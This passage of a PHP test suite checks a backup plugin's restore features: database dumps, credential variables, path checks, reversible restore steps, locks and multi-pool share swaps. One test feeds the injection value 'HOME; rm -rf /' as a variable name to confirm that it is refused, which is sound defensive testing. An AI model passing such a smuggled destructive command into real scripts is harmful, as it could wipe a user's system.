    same('restore: binds only, without the trailing slash', [['source' => '/mnt/user/appdata/nextcloud/db', 'dest' => '/var/lib/mysql', 'rw' => true]], $nc['containers'][0]['binds']);
    same('restore: database types from env and image', ['mariadb', null], array_column($nc['containers'], 'db'));
    same('restore: compose files, no path out of the package', [['compose.yaml'], 2], [$nc['compose']['files'], count($nc['files'])]);
    same('restore: templates', ['my-EmbyServer.xml'], $p['apps'][0]['templates']);
    $vm = $p['vms'][0] ?? [];
    same('restore: a VM with its UUID, NVRAM and devices', ['43cd8087-9364-2c3d-eb36-29696480e7d8', ['43cd8087-9364-2c3d-eb36-29696480e7d8_VARS-pure-efi.fd'], 2, false],
        [$vm['uuid'] ?? null, $vm['nvram'] ?? null, $vm['hostdev'] ?? null, $vm['tpm'] ?? null]);
    exec('rm -rf ' . escapeshellarg($tmp));

    $ctx = ['fs' => ['master' => 'zfs', 'disk1' => 'btrfs']];
    same('restore: share paths', [['appdata', 'nextcloud/db', null], ['appdata', 'x', 'master'], null, null, null, ['domains', '', null]],
        [rsSharePath('/mnt/user/appdata/nextcloud/db/', $ctx), rsSharePath('/mnt/master/appdata/x', $ctx), rsSharePath('/mnt/disks/ud/x', $ctx),
         rsSharePath('/mnt/user/appdata/../etc', $ctx), rsSharePath('/mnt/user/.hidden/x', $ctx), rsSharePath('/mnt/user/domains', $ctx)]);

    // whether he suits the server says what is really there (a fresh server: no package, no snapshot yet)
    $set = ['general' => ['dumps_share' => ['UnraidSecretaryOffice']]];
    $cow = ['zfs' => ['master'], 'btrfs' => []];
    $fitOf = fn (array $f) => [$f['ok'], $f['why'], $f['params']['n'] ?? null];
    $ran = fn (int $finished, bool $written) => ['finished' => $finished, 'packages' => ['written' => $written, 'apps' => 25, 'vms' => 3]];
    same('restore fit: the packages of his last look', [true, 'packages', 2],
        $fitOf(rsFit(['time' => 100, 'apps' => [['id' => 'a']], 'vms' => [['id' => 'v']]], [], $set, $cow)));
    same('restore fit: a real run wrote packages after his last look', [true, 'packages', 28], $fitOf(rsFit(['time' => 100, 'apps' => []], $ran(200, true), $set, $cow)));
    same('restore fit: set up, no packages yet (none written, or before his look)', [[true, 'no_packages', null], [true, 'no_packages', null], [true, 'no_packages', null]],
        [$fitOf(rsFit(['time' => 100, 'apps' => []], $ran(200, false), $set, $cow)), $fitOf(rsFit(['time' => 300, 'apps' => []], $ran(200, true), $set, $cow)),
         $fitOf(rsFit(['time' => 300], [], $set, ['zfs' => [], 'btrfs' => []]))]);
    same('restore fit: a fresh server with ZFS — nothing yet, worth hiring with Mr. Backupsy (never «snapshots»)', [true, 'with_backup', null],
        $fitOf(rsFit(['time' => 0], [], [], $cow)));
    same('restore fit: neither packages nor ZFS/btrfs', [false, 'nothing', null], $fitOf(rsFit(['time' => 0], [], [], ['zfs' => [], 'btrfs' => []])));
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/restore/lang/en.json'), true) ?: [];
    foreach (['packages', 'no_packages', 'with_backup', 'nothing'] as $why) {
        check("restore fit: words for $why", isset($en["fit.$why"]));
    }
}

/**
 * Mr. Restori restores (steps 2-6): what a dump holds per database, the credentials only as variable names in
 * the container's script, where things go aside (flash, next to it), clean paths, Kopia's list; the job's steps on
 * a temporary folder (aside, put, move, fresh, copy — each recording how «Put back» undoes it) and the put back
 * built from the journal; the engine's lock with his note; a whole job as its own process (done, and refused while
 * the lock is held); interrupted journals; the Dashboard's row. Everything in a temporary folder.
 */
function testRestoreJobs(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-rsjob-' . getmypid();
    @mkdir("$tmp/data/unraid-backup/state", 0700, true);
    $GLOBALS['rs']['data'] = "$tmp/data/restore";
    $GLOBALS['rs']['job_file'] = "$tmp/data/restore-job.json";
    $GLOBALS['rs']['ub_data'] = "$tmp/data/unraid-backup";

    // what a dump holds: tables per database (pg_dumpall's \connect in its forms), complete lines only
    $db = null;
    $count = [];
    rsDumpCount("\\connect template1\nCREATE TABLE x (\n\\connect zztest\nCREATE TABLE public.a (\nCREATE TABLE public.b (\n"
        . "\\connect -reuse-previous=on \"dbname='o''brien'\"\nCREATE TABLE c (\n\\connect \"My \"\"DB\"\"\"\nCREATE TABLE d (\n-- CREATE TABLE not\n", $db, $count);
    same('restore: tables per database from a dump', ['template1' => 1, 'zztest' => 2, "o'brien" => 1, 'My "DB"' => 1], $count);
    file_put_contents("$tmp/d.sql.gz", gzencode(str_repeat("CREATE TABLE t (\n", 3)));
    same('restore: a .gz\'s size from its trailer', 51, rsGzSize("$tmp/d.sql.gz"));
    same('restore: tables of a dump read from the file', ['' => 3], rsDumpTables("$tmp/d.sql.gz"));

    // credentials: only variable names, only known ones; the script never carries a value
    same('restore: Postgres logs in with the package\'s variables', ['login' => 'user', 'user_var' => 'POSTGRES_USER', 'password_var' => 'POSTGRES_PASSWORD'],
        rsLogin(['type' => 'postgres', 'user_var' => 'POSTGRES_USER', 'password_var' => 'POSTGRES_PASSWORD']));
    same('restore: an unknown variable falls back to the image\'s', 'MARIADB_ROOT_PASSWORD', rsLogin(['type' => 'mariadb', 'login' => 'root', 'password_var' => 'PATH'])['password_var']);
    same('restore: MariaDB as the app\'s user', ['login' => 'user', 'user_var' => 'MARIADB_USER', 'password_var' => 'MARIADB_PASSWORD'],
        rsLogin(['type' => 'mariadb', 'login' => 'user', 'user_var' => 'MARIADB_USER', 'password_var' => 'MARIADB_PASSWORD']));
    $script = rsDbScript('dump', ['type' => 'mariadb', 'login' => 'user', 'user_var' => 'MARIADB_USER', 'password_var' => 'MARIADB_PASSWORD']);
    check('restore: the dump script names variables and takes the database as $1',
        str_contains($script, '-u"$MARIADB_USER" -p"$MARIADB_PASSWORD"') && str_contains($script, '--databases "$1"'), $script);
    check('restore: a fresh cluster is ready over TCP (not the init server on the socket), a running one on the socket',
        str_contains(rsDbScript('ready', ['type' => 'postgres', 'tcp' => true]), '-h 127.0.0.1') && !str_contains(rsDbScript('ready', ['type' => 'postgres']), '-h '));
    check('restore: a database name from the dump never goes to psql -d (a connection string there)',
        str_contains(rsDbScript('tables', ['type' => 'postgres']), 'PGDATABASE="$1"') && !str_contains(rsDbScript('tables', ['type' => 'postgres']), '-d '));
    try {
        rsDbScript('play', ['type' => 'postgres', 'user_var' => 'HOME; rm -rf /', 'password_var' => '']);
        check('restore: a variable not on the list is refused', false);
    } catch (Problem) {
        check('restore: a variable not on the list is refused', true);
    }

    // where what he replaces goes aside
    same('restore: a template aside on the flash', '/x/aside/20261006-120000/plugins/dockerMan/templates-user/my-a.xml',
        rsAsideFor('/boot/config/plugins/dockerMan/templates-user/my-a.xml', '20261006-120000', 'restored-aside', '/x/aside'));
    same('restore: a file outside the flash goes aside next to it', '/mnt/user/appdata/x/compose.yaml.restored-aside-20261006-120000',
        rsAsideFor('/mnt/user/appdata/x/compose.yaml', '20261006-120000'));
    same('restore: clean paths', [true, false, false, false, false], array_map('rsCleanPath', ['/mnt/user/a/b.env', '/mnt/user/../etc', 'rel/x', "/a/b\n", '/a//b']));
    // relative to now, so the test doesn't depend on the time of day it runs
    $recent = date('Ymd-His', time() - 60);
    $future = date('Ymd-His', time() + 3600);
    $old = date('Ymd-His', time() - 2 * 86400);
    same('restore: a stamp from the page only when it is plausible',
        [true, false, false, 15],
        [rsStampOf(['stamp' => $recent]) === $recent, rsStampOf(['stamp' => $future]) === $future,
         rsStampOf(['stamp' => $old]) === $old, strlen(rsStampOf(['stamp' => "$recent\n"]))]);

    // Kopia's list: only real ids, newest first, texts cut
    same('restore: Kopia\'s snapshots', [['abcdef0123456789abcdef0123456789', 2], ['0123456789abcdef0123456789abcdef', 1]],
        array_map(fn ($s) => [$s['id'], $s['files']], rsKopiaParse(json_encode([
            ['id' => '0123456789abcdef0123456789abcdef', 'startTime' => '2026-10-01T01:00:00Z', 'stats' => ['totalSize' => 5, 'fileCount' => 1]],
            ['id' => '../bad', 'startTime' => '2026-10-03T01:00:00Z'],
            ['id' => 'abcdef0123456789abcdef0123456789', 'startTime' => '2026-10-02T01:00:00Z', 'stats' => ['totalSize' => 7, 'fileCount' => 2], 'description' => "uso-backup\n20261002"],
        ]))));

    // templates and compose files: what differs or is missing, a compose file read elsewhere by its unique place
    @mkdir("$tmp/pkg/compose", 0700, true);
    @mkdir("$tmp/pkg/compose-files", 0700, true);
    @mkdir("$tmp/live/tpl", 0700, true);
    @mkdir("$tmp/live/cm/app", 0700, true);
    @mkdir("$tmp/live/share", 0700, true);
    file_put_contents("$tmp/pkg/my-app.xml", 'new');
    file_put_contents("$tmp/live/tpl/my-app.xml", 'old');
    file_put_contents("$tmp/pkg/compose/compose.yaml", 'same');
    file_put_contents("$tmp/live/cm/app/compose.yaml", 'same');
    file_put_contents("$tmp/pkg/compose/.env", 'A=1');
    file_put_contents("$tmp/pkg/compose-files/compose.yaml", 'indirect');
    $pkg = ['path' => "$tmp/pkg", 'templates' => ['my-app.xml'], 'containers' => [],
            'compose' => ['project' => 'app', 'dir' => 'app', 'working_dir' => "$tmp/live/share", 'config_files' => ["$tmp/live/share/compose.yaml"], 'files' => ['compose.yaml', '.env']],
            'files' => [['path' => 'compose-files/compose.yaml'], ['path' => 'compose-files/../x']]];
    $items = rsConfigItems($pkg, "$tmp/live/cm", "$tmp/live/tpl");
    same('restore: templates and compose files compared', [['template', 'differs'], ['compose', 'same'], ['compose', 'missing'], ['compose_file', 'missing']],
        array_map(fn ($i) => [$i['what'], $i['now']], $items));
    $plan = rsPlanConfigFor(['id' => 'app', 'name' => 'app'], $pkg, null, $items, '20261006-120000', "$tmp/flash");
    same('restore: what differs goes aside next to it, the same stays', ['aside', 'put', 'put', 'put'], array_column($plan['steps'], 'do'));
    same('restore: a file aside next to it', "$tmp/live/tpl/my-app.xml.restored-aside-20261006-120000", $plan['steps'][0]['to']);

    // the job's steps on a temporary folder, each with how «Put back» undoes it
    $id = '20261006-120000-ab12';
    rsPrivateDir(rsData());
    rsPrivateDir(rsDir($id));
    $live = "$tmp/live";
    file_put_contents("$live/db.sqlite", 'current');
    chmod("$live/db.sqlite", 0640);
    @mkdir("$tmp/snap/folder/sub", 0700, true);
    file_put_contents("$tmp/snap/folder/sub/f.txt", 'from the snapshot');
    @mkdir("$live/folder", 0755);
    file_put_contents("$live/folder/f.txt", 'live');
    $plan = rsPlanBase('files', 'zz', ['path' => "$live/folder"]);
    $plan['steps'] = [
        ['do' => 'aside', 'path' => "$live/db.sqlite", 'to' => "$live/db.sqlite.aside-20261006-120000", 'optional' => true],
        ['do' => 'aside', 'path' => "$live/db.sqlite-wal", 'to' => "$live/db.sqlite-wal.aside-20261006-120000", 'optional' => true],
        ['do' => 'put', 'from' => "$tmp/pkg/my-app.xml", 'to' => "$live/db.sqlite", 'mode' => 0600],
        ['do' => 'copy', 'from' => "$tmp/snap/folder", 'to' => "$live/folder.restored-20261006-120000"],
        ['do' => 'aside', 'path' => "$live/folder", 'to' => "$live/folder.aside-20261006-120000"],
        ['do' => 'move', 'from' => "$live/folder.restored-20261006-120000", 'to' => "$live/folder"],
        ['do' => 'put', 'from' => "$tmp/pkg/compose/.env", 'to' => "$live/new.env", 'mode' => 0600],
    ];
    $plan['stamp'] = '20261006-120000';
    $j = rsJournalNew($id, $plan);
    $states = [];
    foreach (array_keys($j['steps']) as $i) {
        $j['steps'][$i] = array_merge($j['steps'][$i], rsStep($j, $i));
        $states[] = $j['steps'][$i]['state'];
    }
    same('restore: the steps ran', ['ok', 'skipped', 'ok', 'ok', 'ok', 'ok', 'ok'], $states);
    clearstatcache();
    same('restore: the copy took the old one\'s mode, the old one aside', ['new', 0640, 'current'],
        [file_get_contents("$live/db.sqlite"), fileperms("$live/db.sqlite") & 0777, file_get_contents("$live/db.sqlite.aside-20261006-120000")]);
    same('restore: the folder swapped in, the live one aside', ['from the snapshot', 'live'],
        [@file_get_contents("$live/folder/sub/f.txt"), @file_get_contents("$live/folder.aside-20261006-120000/f.txt")]);
    same('restore: never over something that is there', 'exists', rsStep($j, 2)['note'] ?? null);
    $j['result'] = 'ok';
    writeAtomic(rsDir($id) . '/plan.json', jsonEncode($plan), 0600, 0, 0);
    rsJournalWrite($j);
    same('restore: what was put aside is in the journal (the missing -wal not)', ["$live/db.sqlite", "$live/folder"], array_column($j['aside'], 'from'));

    // «Put back»: from the journal, newest step first; what he restored goes aside itself
    check('restore: it can be put back', rsCanPutback($j));
    $back = rsPlanSeal(rsPlanPutback(['id' => $id], '20261006-130000'), '20261006-130000');
    same('restore: the put back\'s steps', ['aside', 'aside', 'move', 'aside', 'move'], array_column($back['steps'], 'do'));
    same('restore: nothing blocks the put back', [], $back['blockers']);
    $p = rsJournalNew('20261006-130000-cd34', $back);
    rsPrivateDir(rsDir($p['id']));
    $states = [];
    foreach (array_keys($p['steps']) as $i) {
        $p['steps'][$i] = array_merge($p['steps'][$i], rsStep($p, $i));
        $states[] = $p['steps'][$i]['state'];
    }
    same('restore: the put back ran', ['ok', 'ok', 'ok', 'ok', 'ok'], $states);
    clearstatcache();
    same('restore: everything as before, the restored aside', ['current', 'live', 'new', 'from the snapshot', false],
        [@file_get_contents("$live/db.sqlite"), @file_get_contents("$live/folder/f.txt"), @file_get_contents("$live/db.sqlite.putback-20261006-130000"),
         @file_get_contents("$live/folder.putback-20261006-130000/sub/f.txt"), file_exists("$live/new.env")]);
    rsMarkPutback($id, $p['id'], 'ok');
    check('restore: a restore put back can\'t be put back again', !rsCanPutback(rsJournal($id)));

    // the engine's lock: his note while he holds it, the next one finds it busy, the note goes with him
    $h = rsLockTake('zz-app', 'db');
    same('restore: he holds the lock and says so', ['restore', 'zz-app'], [backupLockHolder(rsUbData())['holder'] ?? null, backupLockHolder(rsUbData())['what'] ?? null]);
    $busy = rsLockTake('other', 'db');
    same('restore: a second one finds it busy', 'restore', is_array($busy) ? $busy['holder'] : 'handle');
    same('restore: nothing starts meanwhile', 'restore_busy_restore', rsBusy()['key'] ?? null);
    rsLockRelease($h);
    same('restore: the lock and his note are gone', [null, false], [backupLockHolder(rsUbData()), is_file(rsUbData() . '/state/lock-holder.json')]);

    // a whole job as its own process (php agent.php job restore <id>), and refused while the lock is held
    $run = function (string $jid) use ($tmp): int {
        exec('OFFICE_DATA_DIR=' . escapeshellarg("$tmp/data") . ' ' . escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg(OFFICE_DIR . '/agent/agent.php')
            . ' job restore ' . escapeshellarg($jid) . ' 2>&1', $out, $code);
        return $code;
    };
    file_put_contents("$live/one.txt", 'one');
    $plan = rsPlanBase('config', 'zz-job', ['app' => 'zz']);
    $plan['stamp'] = '20261006-140000';
    $plan['steps'] = [['do' => 'aside', 'path' => "$live/one.txt", 'to' => "$live/one.txt.aside-20261006-140000"], ['do' => 'put', 'from' => "$tmp/pkg/my-app.xml", 'to' => "$live/one.txt"]];
    $jid = rsLaunch($plan, false);
    same('restore: a job runs on its own', [0, 'ok', 'new', 'one', false], [$run($jid), rsJournal($jid)['result'] ?? null, @file_get_contents("$live/one.txt"),
        @file_get_contents("$live/one.txt.aside-20261006-140000"), is_file(rsUbData() . '/state/lock-holder.json')]);
    same('restore: a job runs once', 1, $run($jid));
    $h = rsLockTake('someone', 'test');
    $plan['steps'] = [['do' => 'aside', 'path' => "$live/one.txt", 'to' => "$live/one.txt.aside-20261006-150000"]];
    $plan['stamp'] = '20261006-150000';
    $jid = rsLaunch($plan, false);
    same('restore: refused while the lock is held — untouched, exit 75', [75, 'refused', 'restore_busy_restore', true],
        [$run($jid), rsJournal($jid)['result'] ?? null, rsJournal($jid)['reason'] ?? null, is_file("$live/one.txt")]);
    rsLockRelease($h);

    // a journal whose job is gone was interrupted; the Dashboard shows a restore only while its heartbeat is fresh
    $k = rsJournalNew('20261006-160000-ef56', $plan);
    rsPrivateDir(rsDir($k['id']));
    $k['result'] = 'running';
    $k['pid'] = 4194305;
    rsJournalWrite($k, false);
    $rows = array_column(rsJournals(), 'result', 'id');
    same('restore: a job that died is interrupted', 'interrupted', $rows[$k['id']] ?? null);
    require_once OFFICE_DIR . '/src/dashboard.php';
    same('dashboard: Mr. Restori while he restores', [true, false, false],
        [officeDashRestoring(['result' => 'running', 'what' => 'x', 'heartbeat' => 1000], 1100), officeDashRestoring(['result' => 'running', 'what' => 'x', 'heartbeat' => 1000], 2000),
         officeDashRestoring(['result' => 'ok', 'what' => 'x', 'heartbeat' => 1000], 1010)]);

    unset($GLOBALS['rs']['data'], $GLOBALS['rs']['job_file'], $GLOBALS['rs']['ub_data']);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Mr. Restori and a share on several pools and disks (like drop: primary hive, secondary mother, an array disk):
 * moments across the parts (the engine's run on all, a manual snapshot on two, a plan's on one), never a moment
 * whose parts hold nothing by default, the union of the parts as the source (primary first), a ZFS dataset of its
 * own at the top of a share from its own snapshots, targets on the share (/mnt/user/<share>/…, never the pool),
 * a whole share entry by entry with what binds it stopping, the swap run and put back, a part with content a
 * moment doesn't cover, a missing share (its old settings as information only), an empty one (straight in), too
 * many entries, a share's settings in words, where Unraid places it and how much room is there. All in a
 * temporary folder: pools as folders, /mnt/user/<share> as a link to its pool (like an exclusive share).
 */
function testRestoreShares(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-rsshare-' . getmypid();
    $mnt = "$tmp/mnt";
    @mkdir("$tmp/data/unraid-backup/state", 0700, true);
    $GLOBALS['rs']['data'] = "$tmp/data/restore";
    $GLOBALS['rs']['job_file'] = "$tmp/data/restore-job.json";
    $GLOBALS['rs']['ub_data'] = "$tmp/data/unraid-backup";
    $GLOBALS['rs']['sizes_file'] = "$tmp/data/restore-sizes.json";
    // what stops: the container that binds the whole share (only asked for with roots, as for a whole share)
    $GLOBALS['rs']['users'] = fn (array $paths, array $roots): array => [$roots ? ['zz-drop'] : [], $roots ? [] : ['zz-drop']];
    $put = function (string $file, ?string $text = null): void {
        @mkdir($text === null ? $file : dirname($file), 0755, true);
        if ($text !== null) {
            file_put_contents($file, $text);
        }
    };
    $snap = fn (string $pool, string $name, string $share = 'zzdrop'): string => "$mnt/$pool/$share/.zfs/snapshot/$name";
    $T0 = (int) strtotime('2026-10-06 01:16');
    $T1 = (int) strtotime('2026-10-06 14:59');
    $T2 = (int) strtotime('2026-10-06 15:00');
    $Th = (int) strtotime('2026-10-05 12:00');
    // live: the data on hive, mother's part empty, the array disk's empty
    $put("$mnt/hive/zzdrop/files");
    $put("$mnt/hive/zzdrop/texts/t1.txt", 'live text');
    $put("$mnt/hive/zzdrop/shares/a/x", 'live x');
    $put("$mnt/mother/zzdrop");
    $put("$mnt/disk1/zzdrop");
    // snapshots: the engine's run on all three, a manual one on hive and mother, a plan's on mother only, one on hive only
    $put($snap('hive', 'hive-only') . '/files/h.png', 'h');
    $put($snap('hive', 'hive-only') . '/texts/t1.txt', 'hive-only text');
    $put($snap('hive', 'unraidbackup-20261006-0100') . '/files/f0.png', 'png0');
    $put($snap('hive', 'manual-x') . '/files/f1.png', 'png1');
    $put($snap('hive', 'manual-x') . '/texts/t1.txt', 'old text');
    $put($snap('hive', 'manual-x') . '/shares');                       // a dataset of its own: empty in its parent's snapshot
    $put($snap('hive', 'manual-x') . '/.thumbs/t', 'thumb');
    $put($snap('hive', 'manual-x') . '/files.restored-20261006-150008/old', 'mine');   // what he left himself: not listed
    $put("$mnt/hive/zzdrop/shares/.zfs/snapshot/manual-x/a/x", 'snap x');
    $put($snap('mother', 'unraidbackup-20261006-0100') . '/files/m0.png', 'm0');
    $put($snap('mother', 'manual-x'));
    $put($snap('mother', 'uso-plan-test-20261006-1500'));
    $put("$mnt/disk1/.btrfs-snap/20261006-0100/zzdrop/files/d1.png", 'd1');
    // the share's settings as the last run packed them (a share that is gone now)
    $put("$tmp/pkg/server/shares/zzgone.cfg", "shareUseCache=\"prefer\"\nshareCachePool=\"hive\"\nshareCachePool2=\"zzpool2\"\nshareAllocator=\"mostfree\"\n"
        . "shareSplitLevel=\"1\"\nshareFloor=\"2000\"\nshareExport=\"eh\"\nshareSecurity=\"private\"\nshareExportNFS=\"-\"\n");
    // an empty share on hive only, and one with too much at its top
    $put("$mnt/hive/zzempty");
    $put($snap('hive', 'manual-e', 'zzempty') . '/data/d.txt', 'd');
    for ($i = 0; $i <= RS_ENTRIES_MAX; $i++) {
        $put($snap('hive', 'manual-m', 'zzmany') . "/f$i");
    }
    $put("$mnt/user");
    foreach (['zzdrop', 'zzempty', 'zzmany'] as $s) {
        symlink("$mnt/hive/$s", "$mnt/user/$s");
    }
    $ctx = [
        'fs' => ['hive' => 'zfs', 'mother' => 'zfs', 'disk1' => 'btrfs'],
        'zfs' => ["$mnt/hive/zzdrop" => 'zz-hive/zzdrop', "$mnt/mother/zzdrop" => 'zz-mother/zzdrop', "$mnt/hive/zzdrop/shares" => 'zz-hive/zzdrop/shares',
                  "$mnt/hive/zzempty" => 'zz-hive/zzempty', "$mnt/hive/zzmany" => 'zz-hive/zzmany'],
        'snaps' => ['zz-hive/zzdrop' => [['name' => 'hive-only', 'time' => $Th], ['name' => 'unraidbackup-20261006-0100', 'time' => $T0], ['name' => 'manual-x', 'time' => $T1]],
                    'zz-mother/zzdrop' => [['name' => 'unraidbackup-20261006-0100', 'time' => $T0 + 60], ['name' => 'manual-x', 'time' => $T1], ['name' => 'uso-plan-test-20261006-1500', 'time' => $T2]],
                    'zz-hive/zzdrop/shares' => [['name' => 'manual-x', 'time' => $T1]],
                    'zz-hive/zzempty' => [['name' => 'manual-e', 'time' => $T1]], 'zz-hive/zzmany' => [['name' => 'manual-m', 'time' => $T1]]],
        // disk1 still holds a part of it (the engine noted it at the setup): the array is no storage of the share any more
        'asleep' => [], 'prefixes' => ['uso-backup-', 'unraidbackup-'], 'btrfs_dir' => '.btrfs-snap', 'settings' => ['share|zzdrop' => ['locations' => ['hive, mother, disk1']]],
        'cfg' => ['zzdrop' => ['shareUseCache' => 'prefer', 'shareCachePool' => 'hive', 'shareCachePool2' => 'mother', 'shareFloor' => '1000'],
                  'zzempty' => ['shareUseCache' => 'only', 'shareCachePool' => 'hive'], 'zzmany' => ['shareUseCache' => 'only', 'shareCachePool' => 'hive'], 'zzgone' => []],
        'mnt' => $mnt, 'user' => "$mnt/user",
        'disks' => ['hive' => ['name' => 'hive', 'fsFree' => '1000000'], 'mother' => ['name' => 'mother', 'fsFree' => '500000'], 'disk1' => ['name' => 'disk1', 'fsFree' => '7']],
        'shares_ini' => ['zzdrop' => ['exclusive' => 'no'], 'zzempty' => ['exclusive' => 'yes'], 'zzmany' => ['exclusive' => 'yes']],
        'old_shares' => "$tmp/pkg/server/shares", 'now' => [],
    ];
    $owner = ['kind' => 'app', 'name' => 'zz', 'id' => 'zz', 'vm_state' => null];
    $stamp = '20261006-160000';
    $c = $ctx;

    // moments: by run (the engine's, on every part — ZFS and btrfs alike) or by name; newest first; which parts each covers
    $m = rsMoments(rsLocate('/mnt/user/zzdrop', $c));
    same('restore shares: moments across the parts, newest first', [
            ['name:uso-plan-test-20261006-1500', ['mother']], ['name:manual-x', ['hive', 'mother']],
            ['run:20261006-0100', ['hive', 'mother', 'disk1']], ['name:hive-only', ['hive']]],
        array_map(fn ($x) => [$x['id'], array_keys($x['parts'])], $m));
    same('restore shares: the engine\'s run named by its ZFS snapshot, the newest part\'s time', ['unraidbackup-20261006-0100', $T0 + 60, true],
        [$m[2]['name'], $m[2]['time'], $m[2]['ours']]);
    rsMomentHolds($m, true);
    same('restore shares: which parts hold anything', [[], ['hive'], ['hive', 'mother', 'disk1'], ['hive']], array_column($m, 'holds'));

    // a whole share: the default moment holds something (not the plan's empty one on mother), its entries, copy by default
    $p = rsPlanFilesFor('/mnt/user/zzdrop', '', '', false, $owner, $stamp, $c);
    same('restore shares: the default moment is never one whose parts hold nothing', 'name:manual-x', $p['target']['snap']);
    same('restore shares: the moment\'s parts', [['hive', true, true], ['mother', true, false], ['disk1', false, false]],
        array_map(fn ($x) => [$x['base'], $x['covered'], $x['holds']], $p['moment']['parts']));
    same('restore shares: entries at its top (his own leftovers not)', ['.thumbs', 'files', 'shares', 'texts'], array_column($p['options']['entries'], 'name'));
    same('restore shares: data there, so copy by default', ['copy', []], [$p['target']['mode'], $p['blockers']]);
    same('restore shares: copies go onto the share, not the pool', ["$mnt/user/zzdrop/.thumbs.restored-$stamp", "$mnt/user/zzdrop/files.restored-$stamp",
            "$mnt/user/zzdrop/shares.restored-$stamp", "$mnt/user/zzdrop/texts.restored-$stamp"],
        array_column($p['steps'], 'to'));
    same('restore shares: a dataset of its own comes from its own snapshot', ["$mnt/hive/zzdrop/shares/.zfs/snapshot/manual-x"], $p['steps'][2]['sources']);
    $notes = array_column($p['notes'], 'key');
    check('restore shares: Unraid places it by the share\'s settings', in_array('note.files_place2', $notes, true), json_encode($notes));
    $place = array_values(array_filter($p['notes'], fn ($n) => $n['key'] === 'note.files_place2'))[0]['params'] ?? [];
    same('restore shares: primary and secondary storage', ['/mnt/user/zzdrop', 'hive', 'mother'], [$place['path'] ?? null, $place['primary'] ?? null, $place['secondary'] ?? null]);

    // chosen entries, swapped: copies first, what binds the whole share stops, each aside through the share, the copy in place
    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/zzdrop', 'name:manual-x', 'swap', false, $owner, $stamp, $c, ['texts', 'files', 'nope']);
    same('restore shares: only chosen entries that are there, in their order', ['files', 'texts'], $p['target']['items']);
    same('restore shares: the swap\'s steps', ['copy', 'copy', 'stop', 'aside', 'move', 'aside', 'move', 'start'], array_column($p['steps'], 'do'));
    same('restore shares: what binds the share stops', [['zz-drop'], ['zz-drop']], [$p['steps'][2]['containers'], $p['stops']]);
    same('restore shares: aside on the share', ["$mnt/user/zzdrop/files" => "$mnt/user/zzdrop/files.aside-$stamp", "$mnt/user/zzdrop/texts" => "$mnt/user/zzdrop/texts.aside-$stamp"],
        array_column($p['aside'], 'to', 'from'));
    same('restore shares: nothing blocks it', [], $p['blockers']);
    $c = $ctx;
    $q = rsPlanFilesFor('/mnt/user/zzdrop', 'name:manual-x', 'swap', false, $owner, $stamp, $c, ['shares']);
    same('restore shares: a dataset of its own whose mountpoint isn\'t inherited is not swapped', ['restore_swap_mountpoint'], array_column($q['blockers'], 'key'));
    $c = $ctx;
    same('restore shares: nothing chosen', ['restore_nothing_chosen'], array_column(rsPlanFilesFor('/mnt/user/zzdrop', 'name:manual-x', 'swap', false, $owner, $stamp, $c, [])['blockers'], 'key'));

    // the swap runs on the folders, then «Put back» brings back what was there
    $id = "$stamp-ab12";
    rsPrivateDir(rsData());
    rsPrivateDir(rsDir($id));
    $p['stamp'] = $stamp;
    $j = rsJournalNew($id, $p);
    $states = [];
    foreach (array_keys($j['steps']) as $i) {
        $j['steps'][$i] = array_merge($j['steps'][$i], rsStep($j, $i));
        $states[] = $j['steps'][$i]['state'];
    }
    same('restore shares: the swap ran', array_fill(0, 8, 'ok'), $states);
    clearstatcache();
    same('restore shares: the snapshot\'s state in place, the live one aside', ['png1', 'old text', 'live text'],
        [@file_get_contents("$mnt/hive/zzdrop/files/f1.png"), @file_get_contents("$mnt/hive/zzdrop/texts/t1.txt"), @file_get_contents("$mnt/hive/zzdrop/texts.aside-$stamp/t1.txt")]);
    $j['result'] = 'ok';
    writeAtomic(rsDir($id) . '/plan.json', jsonEncode($p), 0600, 0, 0);
    rsJournalWrite($j);
    $back = rsPlanSeal(rsPlanPutback(['id' => $id], '20261006-170000'), '20261006-170000');
    same('restore shares: the put back\'s steps', [['stop', 'aside', 'move', 'aside', 'move', 'start'], []], [array_column($back['steps'], 'do'), $back['blockers']]);
    $pb = rsJournalNew('20261006-170000-cd34', $back);
    rsPrivateDir(rsDir($pb['id']));
    $states = [];
    foreach (array_keys($pb['steps']) as $i) {
        $pb['steps'][$i] = array_merge($pb['steps'][$i], rsStep($pb, $i));
        $states[] = $pb['steps'][$i]['state'];
    }
    clearstatcache();
    same('restore shares: put back — as before, the restored state aside', [array_fill(0, 6, 'ok'), 'live text', false, 'old text', 'png1'],
        [$states, @file_get_contents("$mnt/hive/zzdrop/texts/t1.txt"), file_exists("$mnt/hive/zzdrop/files/f1.png"),
         @file_get_contents("$mnt/hive/zzdrop/texts.putback-20261006-170000/t1.txt"), @file_get_contents("$mnt/hive/zzdrop/files.putback-20261006-170000/f1.png")]);

    // one folder from the engine's run: the union of its parts (primary first), copied together
    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/zzdrop/files', 'run:20261006-0100', 'copy', false, $owner, $stamp, $c);
    same('restore shares: the union of the parts, primary storage first', [$snap('hive', 'unraidbackup-20261006-0100') . '/files', $snap('mother', 'unraidbackup-20261006-0100') . '/files',
            "$mnt/disk1/.btrfs-snap/20261006-0100/zzdrop/files"], $p['steps'][0]['sources'] ?? null);
    $union = array_values(array_filter($p['notes'], fn ($n) => $n['key'] === 'note.files_union'))[0]['params']['bases'] ?? null;
    same('restore shares: said so', 'hive + mother + disk1', $union);
    $j = rsJournalNew("$stamp-ef56", $p);
    rsPrivateDir(rsDir($j['id']));
    $r = rsStep($j, 0);
    same('restore shares: the copy holds every part', ['ok', 'png0', 'm0', 'd1'], [$r['state'], @file_get_contents("$mnt/user/zzdrop/files.restored-$stamp/f0.png"),
        @file_get_contents("$mnt/user/zzdrop/files.restored-$stamp/m0.png"), @file_get_contents("$mnt/user/zzdrop/files.restored-$stamp/d1.png")]);
    $c = $ctx;
    same('restore shares: never over a copy that is there', ['restore_exists'], array_column(rsPlanFilesFor('/mnt/user/zzdrop/files', 'run:20261006-0100', 'copy', false, $owner, $stamp, $c)['blockers'], 'key'));

    // a part with content now that the moment doesn't cover: said so (warning); a moment that holds nothing of it is refused
    $put("$mnt/mother/zzdrop/texts/m.txt", 'on mother');
    $stamp = '20261006-161000';
